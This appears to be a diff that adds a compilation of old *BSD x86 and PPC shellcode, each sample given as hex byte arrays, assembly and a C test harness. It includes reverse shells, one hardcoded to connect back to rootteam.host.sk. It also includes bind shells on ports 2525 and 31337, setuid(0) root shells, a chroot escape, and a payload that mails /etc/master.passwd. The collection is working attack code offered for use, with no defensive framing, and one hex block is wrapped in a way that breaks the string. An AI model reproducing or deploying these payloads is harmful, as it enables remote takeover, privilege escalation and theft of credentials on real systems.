@@ -1,0 +1,958 @@
+/* reverse-portshell *BSD shellcode by noir       */
+/* local usage: ./reverse-shell 192.168.2.33      */
+/* remote:  nc -n -v -v -l -p 6969                */ 
+/* listen on 6969/tcp				  */
+/* noir@gsu.linux.org.tr			  */
+
+
+char shellcode[] = 
+{
+  0x31,0xc9,0x51,0x41,   
+  0x51,0x41,0x51,0x51,
+  0x31,0xc0,0xb0,0x61,
+  0xcd,0x80,0x89,0x07,
+  0x31,0xc9,0x88,0x4f, 
+  0x04,0xc6,0x47,0x05,
+  0x02,0xc7,0x47,0x08,
+  0xc0,0xa8,0x01,0x45, //ipaddr
+  0x66,0xc7,0x47,0x06,   
+  0x1b,0x39,0x6a,0x10,
+  0x8d,0x47,0x04,0x50,  
+  0x8b,0x07,0x50,0x50,
+  0x31,0xc0,0xb0,0x62,   
+  0xcd,0x80,0x31,0xc9,
+  0x51,0x8b,0x07,0x50,   
+  0x50,0x31,0xc0,0xb0,
+  0x5a,0xcd,0x80,0x41,   
+  0x83,0xf9,0x03,0x75,
+  0xef,0x31,0xc9,0x51,   
+  0x51,0x31,0xc0,0xb0,
+  0x17,0xcd,0x80,0xeb,   
+  0x23,0x5b,0x89,0x1f,
+  0x31,0xc9,0x88,0x4b,   
+  0x07,0x89,0x4f,0x04,
+  0x51,0x8d,0x07,0x50,   
+  0x8b,0x07,0x50,0x50,
+  0x31,0xc0,0xb0,0x3b,   
+  0xcd,0x80,0x31,0xc9,
+  0x51,0x51,0x31,0xc0,   
+  0xb0,0x01,0xcd,0x80,
+  0xe8,0xd8,0xff,0xff,   
+  0xff,0x2f,0x62,0x69,
+  0x6e,0x2f,0x73,0x68,   
+  0x41
+};
+
+
+int main(int argc, char ** argv)
+{
+  void (*f) (void);
+  unsigned int d;
+
+  if(!argv[0])
+    exit(0);
+
+  d = inet_addr(argv[1]);
+  printf("IP: %lx shellcode len: %d\n", d, strlen(shellcode));
+
+
+  shellcode[28] = d & 0xff ;
+  shellcode[29] = (d >> 8) & 0xff;
+  shellcode[30] = (d >> 16) & 0xff;
+  shellcode[31] = (d >> 24) & 0xff;
+
+
+  f =  (void *) shellcode;
+  f();
+}
+/*                   www.hack.co.za  [20 march 2001]*/
+
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+/*  the back-connect shellcode. The destination addr is
+0x28402ec3 (rootteam.host.sk) port is 0x8ae (2222).
+size = 93 bytes (little isn't it?)
+Greetz 2 sp00fed
+	written  by 		dev0id #rus-sec /EFnet (rootteam.host.sk)
+
+BITS	32
+
+jmp short	path
+main:
+	pop	esi
+	xor	eax,eax
+	mov byte [esi+1],0x02 	; filling the sock_addr struct
+	mov word [esi+2],0x08ae
+	mov long [esi+4],0x28402ec3 ;(here your addr: rootteam.host.sk)
+	push byte 0x06		;int socket(int domain,int type, int proto) 
+	push byte 0x01
+	push byte 0x02
+	mov	al,97		;/usr/include/sys/syscall.h (socket)
+	push	eax
+	int	0x80
+	mov 	edx,eax		;now in edx we have the descriptor
+	push byte 0x10		;making connect
+	lea	eax,[esi]
+	push	eax
+	push	edx		;eax is our socket descriptor
+	xor	eax,eax
+	mov	al,98		;/usr/include/sys/syscall.h (connect)
+	push	eax
+	int	0x80
+	mov	cl,3
+	mov	ebx,-1
+loop_1:				;making dup2 3 times
+	inc	ebx
+	push	ebx
+	push	edx
+	mov	al,90
+	push	eax
+	int	0x80
+	loopnz	loop_1
+	xor	eax,eax
+	push    eax
+	push long 0x68732f2f
+	push long 0x6e69622f
+	mov	edx,esp
+	push	eax
+	push	esp
+	push	edx
+	mov	al,59		;/usr/include/sys/syscall.h(execve)
+	push	eax
+	int	0x80 
+path:
+	call 	main
+	db 'A'	
+*/
+char shellcode[] =
+	"\xeb\x56\x5e\x31\xc0\xc6\x46\x01\x02\x66\xc7\x46\x02\xae\x08"
+	"\xc7\x46\x04\xc3\x2e\x40\x28\x6a\x06\x6a\x01\x6a\x02\xb0\x61"
+	"\x50\xcd\x80\x89\xc2\x6a\x10\x8d\x06\x50\x52\x31\xc0\xb0\x62"
+	"\x50\xcd\x80\xb1\x03\xbb\xff\xff\xff\xff\x43\x53\x52\xb0\x5a"
+	"\x50\xcd\x80\xe0\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
+	"\x62\x69\x6e\x89\xe2\x50\x54\x52\xb0\x3b\x50\xcd\x80\xe8\xa5"
+	"\xff\xff\xff\x41";
+int
+main()
+{
+	int *ret;
+	ret=(int*)&ret+2;
+	(*ret)=(int)shellcode;
+}
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+/* execve_sh.c by n0gada	
+   27 bytes.
+*/
+#include "stdio.h"
+
+char shellcode[]=
+"\xeb\x0d\x5f\x31\xc0\x50\x89\xe2"
+"\x52\x57\x54\xb0\x3b\xcd\x80\xe8"
+"\xee\xff\xff\xff/bin/sh";
+
+int main(void)
+{
+ int *ret;
+
+	printf("%d\n",strlen(shellcode));	
+	ret = (int *)&ret+2;
+	*ret = (int)shellcode;
+
+return 0;
+
+}
+
+/*********************************************
+execve_sh.s
+
+	.globl main
+	main:
+		jmp strings
+	start:
+		pop %edi
+		xorl %eax,%eax
+		push %eax
+		movl %esp,%edx
+		push %edx
+		push %edi
+		push %esp
+		movb $0x3b,%al
+		int $0x80
+
+	strings: call start
+		.string "/bin/sh"
+
+*********************************************/
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+/* Self decripting (dec/inc) shellcode executes /bin/sh
+   Size  49 bytes
+   OS	   *BSD
+  		/rootteam/dev0id	(www.sysworld.net)
+			dev0id@uncompiled.com 
+
+BITS	32
+jmp	short	shellcode
+main:
+	pop	esi
+	xor	ecx,ecx
+	mov	cl,28
+main_decript:	
+	inc byte [esi+ecx]
+	loop	main_decript
+	inc byte [esi]
+	push	esi
+	ret	
+
+
+shellcode:
+call	main
+
+db 	0xea,0x0d,0x5d,0x30,0xbf,0x87,0x45,0x06,0x4f,0x53,0x55,0xaf,0x3a,0x4f,0xcc
+db	0x7f,0xe7,0xec,0xfe,0xfe,0xfe,0x2e,0x61,0x68,0x6d,0x2e,0x72,0x67
+*/
+
+char shellcode[] =
+	"\xeb\x0e\x5e\x31\xc9\xb1\x1c\xfe\x04\x0e\xe2\xfb\xfe\x06\x56"
+	"\xc3\xe8\xed\xff\xff\xff\xea\x0d\x5d\x30\xbf\x87\x45\x06\x4f"
+	"\x53\x55\xaf\x3a\x4f\xcc\x7f\xe7\xec\xfe\xfe\xfe\x2e\x61\x68"
+	"\x6d\x2e\x72\x67";
+
+int
+main(void)
+{
+	int *ret;
+	ret = (int*)&ret + 2;
+	(*ret) = shellcode;
+}
+
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+/*
+ -------------- bds/x86-bindshell on port 2525 167 bytes -------------------------
+ *  AUTHOR : beosroot
+ *   OS    : BSDx86 (Tested on FreeBSD)
+ *   EMAIL : beosroot@hotmail.fr
+             beosroot@null.net
+ *  GR33TZ To : joseph-h, str0ke, MHIDO55,.....
+ */
+ 
+const char shellcode[] =
+    "\x6a\x00"                  // push   $0x0
+    "\x6a\x01"                  // push   $0x1
+    "\x6a\x02"                  // push   $0x2
+    "\x50"                      // push   %eax
+    "\x6a\x61"                  // push   $0x61
+    "\x58"                      // pop    %eax
+    "\xcd\x80"                  // int    $0x80
+    "\x50"                      // push   %eax
+    "\x6a\x00"                  // push   $0x0
+    "\x6a\x00"                  // push   $0x0
+    "\x6a\x00"                  // push   $0x0
+    "\x6a\x00"                  // push   $0x0
+    "\x68\x10\x02\x09\xdd"      // push   $0xdd090210
+    "\x89\xe0"                  // mov    %esp,%eax
+    "\x6a\x10"                  // push   $0x10
+    "\x50"                      // push   %eax
+    "\xff\x74\x24\x1c"          // pushl  0x1c %esp
+    "\x50"                      // push   %eax
+    "\x6a\x68"                  // push   $0x68
+    "\x58"                      // pop    $eax
+    "\xcd\x80"                  // int    $0x80
+    "\x6a\x01"                  // push   $0x1
+    "\xff\x74\x24\x28"          // pushl  0x28 %esp
+    "\x50"                      // push   %eax
+    "\x6a\x6a"                  // push   $0x6a
+    "\x58"                      // pop    $eax
+    "\xcd\x80"                  // int    $0x80
+    "\x83\xec\x10"              // sub    $0x10,$esp
+    "\x6a\x10"                  // push   $0x10
+    "\x8d\x44\x24\x04"          // lea    0x4%esp,%eax
+    "\x89\xe1"                  // mov    %esp,%ecx
+    "\x51"                      // push   %ecx
+    "\x50"                      // push   %eax
+    "\xff\x74\x24\x4c"          // pushl  0x4c %esp
+    "\x50"                      // push   %eax
+    "\x6a\x1e"                  // push   %0x1e
+    "\x58"                      // pop    %eax
+    "\xcd\x80"                  // int    $0x80
+    "\x50"                      // push   %eax
+    "\xff\x74\x24\x58"          // pushl  0x58 %esp
+    "\x50"                      // push   %eax
+    "\x6a\x06"                  // push   $0x6
+    "\x58"                      // pop    %eax
+    "\xcd\x80"                  // int    $0x80
+    "\x6a\x00"                  // push   $0x0
+    "\xff\x74\x24\x0c"          // pushl  0xc %esp
+    "\x50"                      // push   %eax
+    "\x6a\x5a"                  // push   $0x5a
+    "\x58"                      // pop    %eax
+    "\xcd\x80"                  // int    $0x80
+    "\x6a\x01"                  // push   $0x1
+    "\xff\x74\x24\x18"          // pushl  0x18 %esp
+    "\x50"                      // push   %eax
+    "\x6a\x5a"                  // push   $0x5a
+    "\x58"                      // pop    %eax
+    "\xcd\x80"                  // int    $0x80
+    "\x6a\x02"                  // push   $0x2
+    "\xff\x74\x24\x24"          // pushl  0x24 %esp
+    "\x50"                      // push   %eax
+    "\x6a\x5a"                  // push   $0x5a
+    "\x58"                      // pop    %eax
+    "\xcd\x80"                  // int    $0x80
+    "\x68\x73\x68\x00\x00"      // push   $0x6873
+    "\x89\xe0"                  // mov    %esp,%eax
+    "\x68\x2d\x69\x00\x00"      // push   $0x692d
+    "\x89\xe1"                  // mov    %esp,%ecx
+    "\x6a\x00"                  // push   $0x0
+    "\x51"                      // push   %ecx
+    "\x50"                      // push   %eax
+    "\x68\x2f\x73\x68\x00"      // push   $0x68732f
+    "\x68\x2f\x62\x69\x6e"      // push   $0x6e69622f
+    "\x89\xe0"                  // mov    %esp,%eax
+    "\x8d\x4c\x24\x08"          // lea    0x8 %esp,%ecx
+    "\x6a\x00"                  // push   $0x0
+    "\x51"                      // push   %ecx
+    "\x50"                      // push   %eax
+    "\x50"                      // push   %eax
+    "\x6a\x3b"                  // push   $0x3b
+    "\x58"                      // pop    %eax
+    "\xcd\x80";                 // int    $0x80
+ 
+int main() {
+
+    void (*hell)() = (void *)shellcode;
+    return (*(int(*)())shellcode)();
+
+} 
+
+
+
+// the end o.O
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+/*
+   *BSD version
+   FreeBSD, OpenBSD, NetBSD.
+
+   s0t4ipv6@shellcode.com.ar
+
+   29 bytes.
+
+   -setuid(0);
+   -execve(/bin/sh);
+*/
+
+char shellcode[]=
+
+   "\x31\xc0"                      // xor          %eax,%eax
+   "\x50"                          // push         %eax
+   "\xb0\x17"                      // mov          $0x17,%al
+   "\x50"                          // push         %eax
+   "\xcd\x80"                      // int          $0x80
+   "\x50"                          // push         %eax
+   "\x68\x6e\x2f\x73\x68"          // push         $0x68732f6e
+   "\x68\x2f\x2f\x62\x69"          // push         $0x69622f2f
+   "\x89\xe3"                      // mov          %esp,%ebx
+   "\x50"                          // push         %eax
+   "\x54"                          // push         %esp
+   "\x53"                          // push         %ebx
+   "\x50"                          // push         %eax
+   "\xb0\x3b"                      // mov          $0x3b,%al
+   "\xcd\x80";                     // int          $0x80
+
+main()
+{
+   int *ret;
+   printf("Shellcode lenght=%d\n",sizeof(shellcode));
+   ret=(int*)&ret+2;
+   (*ret)=(int)shellcode;
+}
+
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+/*
+   *BSD version
+   FreeBSD, OpenBSD, NetBSD.
+
+   s0t4ipv6@shellcode.com.ar
+
+   92 bytes.
+
+   _execve(/bin/sh -c "/bin/cat /etc/master.passwd|mail root@localhost");
+   pueden reemplzar el comando por lo que se les ocurra.
+*/
+
+char shellcode[]=
+
+    "\xeb\x25"             /* jmp     <_shellcode+39>         */
+    "\x59"                 /* popl    %ecx                   */
+    "\x31\xc0"             /* xorl    %eax,%eax              */
+    "\x50"                 /* pushl   %eax                   */
+    "\x68\x6e\x2f\x73\x68" /* push    $0x68732f6e            */
+    "\x68\x2f\x2f\x62\x69" /* push    $0x69622f2f            */
+    "\x89\xe3"             /* movl    %esp,%ebx              */
+    "\x50"                 /* pushl   %eax                   */
+    "\x66\x68\x2d\x63"     /* pushw   $0x632d                */
+    "\x89\xe7"             /* movl    %esp,%edi              */
+    "\x50"                 /* pushl   %eax                   */
+    "\x51"                 /* pushl   %ecx                   */
+    "\x57"                 /* pushl   %edi                   */
+    "\x53"                 /* pushl   %ebx                   */
+    "\x89\xe7"             /* movl    %esp,%edi              */
+    "\x50"                 /* pushl   %eax                   */
+    "\x57"                 /* pushl   %edi                   */
+    "\x53"                 /* pushl   %ebx                   */
+    "\x50"                 /* pushl   %eax                   */
+    "\xb0\x3b"             /* movb    $0x0b,%al              */
+    "\xcd\x80"             /* int     $0x80                  */
+    "\xe8\xd6\xff\xff\xff" /* call    <_shellcode+2>          */
+    "/bin/cat /etc/master.passwd|mail root@localhost";
+
+main()
+{
+   int *ret;
+   printf("Shellcode lenght=%d\n",sizeof(shellcode));
+   ret=(int*)&ret+2;
+   (*ret)=(int)shellcode;
+}
+
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+/*
+   *BSD version
+   FreeBSD, OpenBSD, NetBSD.
+
+   s0t4ipv6@shellcode.com.ar
+
+   45 bytes.
+
+   -break chrooted
+*/
+
+char shellcode[]=
+
+    "\x68\x62\x2e\x2e\x2e" /* pushl   $0x2e2e2e62            */
+    "\x89\xe7"             /* movl    %esp,%edi              */
+    "\x33\xc0"             /* xorl    %eax,%eax              */
+    "\x88\x47\x03"         /* movb    %al,0x3(%edi)          */
+    "\x57"                 /* pushl   %edi                   */
+    "\xb0\x88"             /* movb    $0x88,%al              */
+    "\x50"                 /* pushl   %eax                   */
+    "\xcd\x80"             /* int     $0x80                  */
+    "\x57"                 /* pushl   %edi                   */
+    "\xb0\x3d"             /* movb    $0x3d,%al              */
+    "\x50"                 /* pushl   %eax                   */
+    "\xcd\x80"             /* int     $0x80                  */
+    "\x47"                 /* incl    %edi                   */
+    "\x33\xc9"             /* xorl    %ecx,%ecx              */
+    "\xb1\xff"             /* movb    $0xff,%cl              */
+    "\x57"                 /* pushl   %edi                   */
+    "\x50"                 /* pushl   %eax                   */
+    "\xb0\x0c"             /* movb    $0x0c,%al              */
+    "\xcd\x80"             /* int     $0x80                  */
+    "\xe2\xfa"             /* loop    <shellcode +31>        */
+    "\x47"                 /* incl    %edi                   */
+    "\x57"                 /* pushl   %edi                   */
+    "\xb0\x3d"             /* movb    $0x3d,%al              */
+    "\x50"                 /* pushl   %eax                   */
+    "\xcd\x80";            /* int     $0x80                  */
+
+main()
+{
+   int *ret;
+   printf("Shellcode lenght=%d\n",sizeof(shellcode));
+   ret=(int*)&ret+2;
+   (*ret)=(int)shellcode;
+}
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+/*
+ * $Id: portbind-bsd.c,v 1.3 2004/06/02 12:22:30 raptor Exp $
+ *
+ * portbind-bsd.c - setuid/portbind shellcode for *BSD/x86
+ * Copyright (c) 2003 Marco Ivaldi < raptor@0xdeadbeef.info >
+ *
+ * Simple portbind shellcode that bind()'s a setuid(0) shell on
+ * port 31337/tcp (based on bighawk's code).
+ *
+ * Tested on OpenBSD and FreeBSD.
+ */
+
+/*
+ * setuid(0)
+ *
+ * 20c8:       31 c0                   xor    %eax,%eax
+ * 20ca:       50                      push   %eax
+ * 20cb:       50                      push   %eax
+ * 20cc:       b0 17                   mov    $0x17,%al
+ * 20ce:       cd 80                   int    $0x80
+ *
+ * socket(AF_INET, SOCK_STREAM, 0)
+ *
+ * 20d0:       31 c9                   xor    %ecx,%ecx
+ * 20d2:       f7 e1                   mul    %ecx,%eax
+ * 20d4:       51                      push   %ecx
+ * 20d5:       41                      inc    %ecx
+ * 20d6:       51                      push   %ecx
+ * 20d7:       41                      inc    %ecx
+ * 20d8:       51                      push   %ecx
+ * 20d9:       51                      push   %ecx
+ * 20da:       b0 61                   mov    $0x61,%al
+ * 20dc:       cd 80                   int    $0x80
+ *
+ * bind(s, server, sizeof(server))
+ *
+ * 20de:       89 c3                   mov    %eax,%ebx
+ * 20e0:       52                      push   %edx
+ * 20e1:       66 68 7a 69             pushw  $0x697a
+ * 20e5:       66 51                   push   %cx
+ * 20e7:       89 e6                   mov    %esp,%esi
+ * 20e9:       b1 10                   mov    $0x10,%cl
+ * 20eb:       51                      push   %ecx
+ * 20ec:       56                      push   %esi
+ * 20ed:       50                      push   %eax
+ * 20ee:       50                      push   %eax
+ * 20ef:       b0 68                   mov    $0x68,%al
+ * 20f1:       cd 80                   int    $0x80
+ *
+ * listen(s, 1)
+ *
+ * 20f3:       51                      push   %ecx
+ * 20f4:       53                      push   %ebx
+ * 20f5:       53                      push   %ebx
+ * 20f6:       b0 6a                   mov    $0x6a,%al
+ * 20f8:       cd 80                   int    $0x80
+ *
+ * accept(s, 0, 0)
+ *
+ * 20fa:       52                      push   %edx
+ * 20fb:       52                      push   %edx
+ * 20fc:       53                      push   %ebx
+ * 20fd:       53                      push   %ebx
+ * 20fe:       b0 1e                   mov    $0x1e,%al
+ * 2100:       cd 80                   int    $0x80
+ *
+ * dup2(c, 2)
+ * dup2(c, 1)
+ * dup2(c, 0)
+ *
+ * 2102:       b1 03                   mov    $0x3,%cl
+ * 2104:       89 c3                   mov    %eax,%ebx
+ * 2106:       b0 5a                   mov    $0x5a,%al
+ * 2108:       49                      dec    %ecx
+ * 2109:       51                      push   %ecx
+ * 210a:       53                      push   %ebx
+ * 210b:       53                      push   %ebx
+ * 210c:       cd 80                   int    $0x80
+ * 210e:       41                      inc    %ecx
+ * 210f:       e2 f5                   loop   2106 <_sc+0x3e>
+ *
+ * execve("/bin/sh", ["/bin/sh"], NULL)
+ *
+ * 2111:       51                      push   %ecx
+ * 2112:       68 2f 2f 73 68          push   $0x68732f2f
+ * 2117:       68 2f 62 69 6e          push   $0x6e69622f
+ * 211c:       89 e3                   mov    %esp,%ebx
+ * 211e:       51                      push   %ecx
+ * 211f:       54                      push   %esp
+ * 2120:       53                      push   %ebx
+ * 2121:       53                      push   %ebx
+ * 2122:       b0 3b                   mov    $0x3b,%al
+ * 2124:       cd 80                   int    $0x80
+ */
+
+char sc[] = /* 8 + 86 = 94 bytes */
+"\x31\xc0\x50\x50\xb0\x17\xcd\x80"
+"\x31\xc9\xf7\xe1\x51\x41\x51\x41\x51\x51\xb0\x61\xcd\x80"
+"\x89\xc3\x52\x66\x68"
+"\x7a\x69" // port 31337/tcp, change if needed
+"\x66\x51\x89\xe6\xb1\x10\x51\x56\x50\x50\xb0\x68\xcd\x80"
+"\x51\x53\x53\xb0\x6a\xcd\x80"
+"\x52\x52\x53\x53\xb0\x1e\xcd\x80"
+"\xb1\x03\x89\xc3\xb0\x5a\x49\x51\x53\x53\xcd\x80"
+"\x41\xe2\xf5\x51\x68//sh\x68/bin\x89\xe3\x51\x54\x53\x53\xb0\x3b\xcd\x80";
+
+main()
+{
+	int (*f)() = (int (*)())sc; f();
+}
+
+
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+/*
+ * $Id: setuid-bsd.c,v 1.6 2004/06/02 12:22:30 raptor Exp $
+ *
+ * setuid-bsd.c - setuid/execve shellcode for *BSD/x86
+ * Copyright (c) 2003 Marco Ivaldi < raptor@0xdeadbeef.info >
+ *
+ * Short setuid(0) and /bin/sh execve() shellcode (based on esdee's code).
+ *
+ * Tested on OpenBSD and FreeBSD.
+ */
+
+/*
+ * setuid(0)
+ *
+ * 20c8:       31 c0                   xor    %eax,%eax
+ * 20ca:       50                      push   %eax
+ * 20cb:       50                      push   %eax
+ * 20cc:       b0 17                   mov    $0x17,%al
+ * 20ce:       cd 80                   int    $0x80
+ *
+ * execve("/bin/sh", ["/bin/sh"], NULL)
+ *
+ * 20d0:       31 c0                   xor    %eax,%eax
+ * 20d2:       50                      push   %eax
+ * 20d3:       68 2f 2f 73 68          push   $0x68732f2f
+ * 20d8:       68 2f 62 69 6e          push   $0x6e69622f
+ * 20dd:       89 e3                   mov    %esp,%ebx
+ * 20df:       50                      push   %eax
+ * 20e0:       54                      push   %esp
+ * 20e1:       53                      push   %ebx
+ * 20e2:       50                      push   %eax
+ * 20e3:       b0 3b                   mov    $0x3b,%al
+ * 20e5:       cd 80                   int    $0x80
+ */
+
+char sc[] = /* 7 + 23 = 30 bytes */
+"\x31\xc0\x50\x50\xb0\x17\xcd\x80"
+"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x54\x53\x50\xb0\x3b\xcd\x80";
+
+main()
+{
+	int (*f)() = (int (*)())sc; f();
+}
+
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+/*
+ * bsd/x86 setreuid/exec shellcode
+ *
+ * setreuid(geteuid(), geteuid()) and execve("/bin/sh", "/bin/sh", 0) 
+ * shellcode based on hkpco's setreuid/exec shellcode for linux
+ * Tested on FreeBSD
+*/
+
+#include <stdio.h>
+#include <string.h>
+
+char shellcode[] =
+ "\x31\xc0\xb0\x19\x50\xcd\x80\x50"
+ "\x50\x31\xc0\xb0\x7e\x50\xcd\x80" // setreuid(geteuid(), getuid());
+ "\xeb\x0d\x5f\x31\xc0\x50\x89\xe2"
+ "\x52\x57\x54\xb0\x3b\xcd\x80\xe8"
+ "\xee\xff\xff\xff/bin/sh"; // exec(/bin/sh)
+
+int main()
+{
+int (*f)() = (int (*)())shellcode;
+ printf("%d\n",strlen(shellcode));
+f();
+ return 0;
+}
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+/*
+ *  Linux PPC shellcode
+ *  execve() of /bin/sh by Palante
+ */
+
+long shellcode[] = { /* Palante's BSD PPC shellcode w/ NULL*/
+  0x7CC63278, 0x2F867FFF, 0x41BC005C, 0x7C6802A6,
+  0xB0C3FFF9, 0xB0C3FFF1, 0x38867FF0, 0x38A67FF4,
+  0x38E67FF3, 0x7CA52278, 0x7CE72278, 0x7C853A14,
+  0x7CC419AE, 0x7C8429D6, 0x7C842214, 0x7C043A14,
+  0x7CE72850, 0x7C852A14, 0x7C63212E, 0x7C832214,
+  0x7CC5212E, 0x7CA52A78, 0x44FFFF02, 0x7CE03B78,
+  0x44FFFF02, 0x4BFFFFA9, 0x2F62696E, 0x2F73685A,
+  0xFFFFFFFF, 0xFFFFFFFF
+}; 
+
+
+void main()
+{
+  __asm__("b shellcode");
+}
+
+/*              disassembly
+
+        .section ".text"      # Palante's BSD PPC shellcode
+        .align 2
+        .globl m
+        .type    m,@function
+m:
+	xor  6,6,6            # r6 is 0
+	cmpi  7,0,6,0x7FFF    # do meaningless compare
+        bc 13,28,L2           # conditional branch to L2 # CAUSES NULL BYTE
+L1:     mfspr 3,8	      # address of /bin/sh into r3 (execve parameter)
+			
+	sth  6,-7(3)          # fix sc opcode
+	sth  6,-15(3)         # fix sc opcode
+	
+	addi 4,6,0x7FF0
+	addi 5,6,0x7FF4
+	addi 7,6,0x7FF3
+	xor  5,5,4            #got 0x4 into r5
+	xor  7,7,4            #got 0x3 into r7
+
+	
+	add  4,5,7            # r4 = 0x7
+	stbx 6,4,3            # store null after /bin/sh
+
+	mullw 4,4,5           # r4 = 0x1c (28)
+        add  4,4,4            # r4 = 0x38 (56)
+	add  0,4,7            # this makes 59 which is the execve system call
+        
+        sub  7,5,7            # r7 = 0x1 for exit system call	
+
+        add  4,5,5            # r4 = 0x8
+        stwx 3,3,4            # and store pointer to /bin/sh at r3+0x8
+	add  4,3,4            # r4 = r3 + 0x8 (execve parameter)
+	stwx 6,5,4            # store NULL pointer
+        xor 5,5,5             # NULL (execve parameter)
+.long   0x44ffff02            # not quite an sc opcode
+	or 0,7,7              # syscall 1 - exit
+.long   0x44ffff02            # not quite an sc opcode
+
+L2:     bl L1                 # branch and link back to L1
+.long 0x2F62696E              #/bin/shZ
+.long 0x2F73685A
+.long 0xffffffff              # this is where pointer to /bin/sh goes
+.long 0xffffffff              # this is where null pointer goes
+
+.Lfe1:
+.size    m,.Lfe1-m
+
+*/
+
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+; Passive Connection Shellcode
+;
+; Coded by Scrippie - ronald@grafix.nl - http://b0f.freebsd.lublin.pl
+; Buffer0verfl0w Security
+; Why? This evades firewalls...
+;
+; YES, this is for NASM, I detest AT&T syntaxis - it's gross and unreadable
+;
+; This is the FreeBSD variant I whipped up
+;
+; Tnx to dvorak for pointing out that BSD's int 80h assumes a stored EIP
+; on the stack before making it and that BSD has a somewhat different
+; sockaddr_in structure (containing sin_len)
+
+        BITS 32
+
+; Equates - keeps this stuff a lot more clear
+
+PORT            equ 31337               ; What an eleet port!
+
+_exit           equ 1                   ; See /usr/src/sys/kern/syscalls.c
+execve          equ 59                  ; See /usr/src/sys/kern/syscalls.c
+dup2            equ 90                  ; See /usr/src/sys/kern/syscalls.c
+socket          equ 97                  ; See /usr/src/sys/kern/syscalls.c
+connect         equ 98                  ; See /usr/src/sys/kern/syscalls.c
+
+IPPROTO_TCP     equ 6                   ; See netinet/in.h
+PF_INET         equ 2                   ; See sys/socket.h
+SOCK_STREAM     equ 1                   ; See sys/socket.h
+
+sockaddr_in_off equ 0
+shell_off       equ 8
+shell_ptr_off   equ 16
+
+        jmp short EndCode
+
+Start:
+        pop esi                         ; Get offset data in esi
+
+        xor eax, eax
+        xor ebx, ebx
+
+        mov bl, IPPROTO_TCP             ; Push IPPROTO_TCP
+        push ebx
+        mov bl, SOCK_STREAM             ; Push SOCK_STREAM
+        push ebx
+        mov bl, PF_INET                 ; Push PF_INET
+        push ebx
+        push ebx                        ; Skipped by int 80h
+        mov al, socket                  ; Select socket() syscall
+
+        int 80h                         ; socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
+        mov edx, eax                    ; Save the resulting socket descriptor
+
+        mov byte [esi+sockaddr_in_off+1], PF_INET ; sin_family -> PF_INET
+        mov word [esi+sockaddr_in_off+2], PORT  ; Set the port number
+
+        mov bl, 16                      ; sizeof(sockaddr_in)
+        push ebx
+
+        lea ebx, [esi+sockaddr_in_off]  ; Get offset sockaddr_in into ebx
+        push ebx                        ; Push it
+        push eax                        ; Still holds sockfd
+        push eax                        ; Canary value
+
+        mov al, connect                 ; Select connect() syscall
+        int 80h                         ; connect(sockfd, sockaddr_in, 10)
+
+        xor ebx, ebx
+        push ebx
+        push edx
+        mov al, dup2                    ; Select dup2 syscall
+
+        push eax                        ; Ruined
+        int 80h
+
+        inc bl
+        push ebx
+        push edx
+        mov al, dup2                    ; Do the same for stdout
+        
+        push eax
+        int 80h
+
+        inc bl
+        push ebx
+        push edx
+        mov al, dup2                    ; And finally for stderr
+
+        push eax
+        int 80h
+
+        xor ebx, ebx
+        push ebx                        ; *envp == NULL
+
+        lea edi, [esi+shell_off+7]
+        xor eax, eax
+        xor ecx, ecx
+        mov cl, 9
+        repe stosb
+
+        lea ebx, [esi+shell_off]        ; Get offset shell into ebx
+        mov [esi+shell_ptr_off], ebx    ; Store it at shell_off
+        lea ecx, [esi+shell_ptr_off]    ; Get offset shell_off into ecx
+        push ecx                        ; argp
+        push ebx                        ; command
+
+        push eax                        ; canary
+        mov al, execve
+        int 80h                         ; Spawn the frikkin' shell
+
+        mov al, _exit                   ; _exit() system call
+        int 80h                         ; Do it
+
+EndCode:
+        call Start
+
+sockaddr_in     db 'ABCC'               ; A=sin_len - B=sin_family - C=port
+                dd 0x100007f            ; IP addr (s_addr) in htonl() form
+; 8 bytes not needed ;)
+
+shell           db '/bin/sh' ;,0
+;shell_ptr      db 1,2,3,4
+
+------------------------------------------------------------------------------
+
+And here's the shellcode equivalent
+
+char shellcode[]=
+"\xeb\x68\x5e\x31\xc0\x31\xdb\xb3\x06\x53\xb3\x01\x53\xb3\x02\x53\x53\xb0\x61\x
+cd\x80\x89\xc2\xc6\x46\x01\x02\x66\xc7\x46\x02\x69\x7a\xb3\x10\x53\x8d\x1e\x53\
+x50\x50\xb0\x62\xcd\x80\x31\xdb\x53\x52\xb0\x5a\x50\xcd\x80\xfe\xc3\x53\x52\xb0
+\x5a\x50\xcd\x80\xfe\xc3\x53\x52\xb0\x5a\x50\xcd\x80\x31\xdb\x53\x8d\x7e\x0f\x3
+1\xc0\x31\xc9\xb1\x09\xf3\xaa\x8d\x5e\x08\x89\x5e\x10\x8d\x4e\x10\x51\x53\x50\x
+b0\x3b\xcd\x80\xb0\x01\xcd\x80\xe8\x93\xff\xff\xff\x41\x42\x43\x43\x7f\x00\x00\
+x01\x2f\x62\x69\x6e\x2f\x73\x68";				    ^
+						             Start of IP addr
+void main() {
+        int *ret;
+
+        ret = (int *)&ret + 2;
+        (*ret) = (int)shellcode;
+}
+
+
+
